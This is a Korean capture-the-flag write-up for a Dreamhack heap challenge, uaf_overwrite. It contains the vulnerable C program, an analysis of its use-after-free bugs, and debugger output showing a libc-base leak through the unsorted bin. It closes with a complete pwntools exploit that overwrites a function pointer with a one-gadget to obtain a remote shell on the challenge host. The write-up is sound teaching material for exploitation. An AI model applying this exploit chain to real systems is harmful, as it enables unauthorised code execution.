```c
// Name: uaf_overwrite.c
// Compile: gcc -o uaf_overwrite uaf_overwrite.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};

struct Human *human;
struct Robot *robot;
char *custom[10];
int c_idx;

void print_name() { printf("Name: %s\n", robot->name); }

void menu() {
  printf("1. Human\n");
  printf("2. Robot\n");
  printf("3. Custom\n");
  printf("> ");
}

void human_func() {
  int sel;
  human = (struct Human *)malloc(sizeof(struct Human));

  strcpy(human->name, "Human");
  printf("Human Weight: ");
  scanf("%d", &human->weight);

  printf("Human Age: ");
  scanf("%ld", &human->age);

  free(human);
}

void robot_func() {
  int sel;
  robot = (struct Robot *)malloc(sizeof(struct Robot));

  strcpy(robot->name, "Robot");
  printf("Robot Weight: ");
  scanf("%d", &robot->weight);

  if (robot->fptr)
    robot->fptr();
  else
    robot->fptr = print_name;

  robot->fptr(robot);

  free(robot);
}

int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}

int main() {
  int idx;
  char *ptr;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    menu();
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        human_func();
        break;
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
    }
  }
}
```

```bash
$ checksec ./uaf_overwrite
[*] './uaf_overwrite'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

# 코드 분석

* `uaf_overwrite.c:8-18` : `struct Human`과 `struct Robot`이 정의되어 있으며, 이 둘의 크기가 같으므로 dangling pointer와 관련된 취약점이 있을 가능성이 있다.
* `uaf_overwrite.c:34-64` : 두 함수 `human_func()`와 `robot_func()`에서, 새롭게 할당한 메모리 영역을 초기화하는 작업을 하지 않고 있으므로 use after free가 발생할 수 있다.
* `uaf_overwrite.c:56-57` : Use after free를 활용하여 `robot->fptr`에 원하는 함수의 주소를 써두면 원하는대로 코드의 실행 흐름을 조작할 수 있다.
* `uaf_overwrite.c:66-94` : 함수 `custom_func()`를 활용하면 크기가 `0x100` 이상인 청크를 할당하고 해제할 수 있으며, 메모리 영역을 초기화하지 않고 있으므로 use after free가 발생할 수 있다.

# 공격

`Robot.fptr`의 값을 one-gadget으로 덮어서 실행 흐름을 조작하면 shell을 탈취할 수 있을 것으로 보인다.
따라서 one-gadget을 활용하기 위해 libc가 매핑된 주소를 얻어내야 한다.

## Library leak

코드 분석에서 얻어낸 취약점은 use after free 뿐이므로 이를 활용하여 libc가 매핑된 주소를 얻어야 한다.
ptmalloc2에서 unsorted bin에 처음 연결되는 청크는 libc의 고정된 특정 주소와 이중 연결 원형 리스트를 형성하므로 unsorted bin에 처음 연결되는 청크는 `fd` 또는 `bk`의 값으로 libc 영역의 특정 주소를 가지고 있다.
따라서 unsorted bin에 연결된 청크를 재할당한 후 use after free 취약점을 활용하여 libc 영역의 특정 주소를 구할 수 있으며, 따라서 libc 영역의 베이스 역시 구할 수 있다.

크기가 `0x410` 이하인 청크는 tcache에 먼저 삽입되므로, 충분히 큰 청크를 할당 해제하여 unsorted bin에 연결시켜야 한 후, 이를 재할당하여 값을 읽으면 libc 영역의 베이스를 leak할 수 있다.

이때, 한 가지 주의할 점은, 탑 청크와 unsorted bin에 포함된 청크는 병합 대상이므로, 2개의 청크를 할당한 후 처음 할당한 청크를 해제해야 한다.

gdb를 활용하여 libc 영역의 특정 주소를 얻어낸 결과는 다음과 같다.

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x251

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x555555603250
Size: 0x421
fd: 0x7ffff7dcdca0
bk: 0x7ffff7dcdca0

Allocated chunk
Addr: 0x555555603670
Size: 0x420

Top chunk | PREV_INUSE
Addr: 0x555555603a90
Size: 0x20571
```

이를 통해 unsorted bin에 연결된 청크의 `fd` 값과 `bk` 값이 모두 `0x7ffff7dcdca0`임을 알 수 있으며, `vmmap` 명령어를 활용하면 `0x7ffff7dcdca0`는 libc 영역에 존재하는 주소임을 알 수 있으며, libc 영역의 베이스를 빼주면 오프셋을 알 수 있다.

```bash
pwndbg> vmmap 0x7ffff7dcdca0
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so +0xca0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
    0x555555400000     0x555555402000 r-xp     2000      0 /home/uaf_overwrite/uaf_overwrite
    0x555555601000     0x555555602000 r--p     1000   1000 /home/uaf_overwrite/uaf_overwrite
    0x555555602000     0x555555603000 rw-p     1000   2000 /home/uaf_overwrite/uaf_overwrite
    0x555555603000     0x555555624000 rw-p    21000      0 [heap]
    0x7ffff79e2000     0x7ffff7bc9000 r-xp   1e7000      0 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bc9000     0x7ffff7dc9000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dc9000     0x7ffff7dcd000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcd000     0x7ffff7dcf000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000      0 [anon_7ffff7dcf]
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000      0 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7fee000     0x7ffff7ff0000 rw-p     2000      0 [anon_7ffff7fee]
    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000      0 [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000      0 [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  29000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2a000 /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
```

`libc`가 매핑된 주소는 `0x7ffff79e2000`이므로 오프셋은 `0x3ebca0`이다.

## Use After Free

`struct Human`과 `struct Robot`은 같은 크기의 구조체이므로 `struct Human`이 해제되고 `struct Robot`이 할당되면 `struct Robot`은 `struct Human`이 사용했던 메모리 영역을 그대로 사용하게 된다.
게다가 `struct Robot`이 할당될 때 메모리 영역을 초기화하지 않고 있으므로, `struct Human`에서 작성된 값이 그대로 사용되게 된다.
즉, `struct Human`의 `age`에 저장되어 있던 값이 그대로 `struct Robot`의 `fptr`에 저장되어 있게 되며, 따라서 `Human.age`에 one-gadget 주소를 입력하고 이어서 `robot_func`를 호출하면 one-gadget을 호출할 수 있을 것이다.

이제 `one_gadget` 툴을 활용하여 one-gadget의 주소들을 얻어내자.

```bash
$ one_gadget libc-2.27.so
0x4f3ce execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

## Exploit

위에서 얻은 것들을 토대로 익스플로잇 코드를 작성하면 다음과 같다.

```python
# Name: uaf_overwrite.py

from pwn import *

def slog(name,addr): success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 16430

p = remote(HOST,PORT)
# p = process('./uaf_overwrite')

# context.log_level = 'debug'

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)
    p.sendlineafter(b': ', str(idx).encode())


# [1] UAF to calculate 'libc_base'
dummy, tag = b'AAAA', b'B'
custom(0x410, dummy, -1)
custom(0x410, dummy, 0)
custom(0x410, tag, -1)

offset, one_gadget_offeset = 0x3ebca0, 0x10a41c
offset //= 0x100
offset *= 0x100
offset += u64(tag.ljust(8, b'\x00'))
libc_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) - offset
one_gadget = libc_base + one_gadget_offeset

slog('libc_base', libc_base)
slog('one_gadget', one_gadget)

# [2] UAF to manipulate `robot->fptr` and get shell
human(1, one_gadget)
robot(1)

p.interactive()
```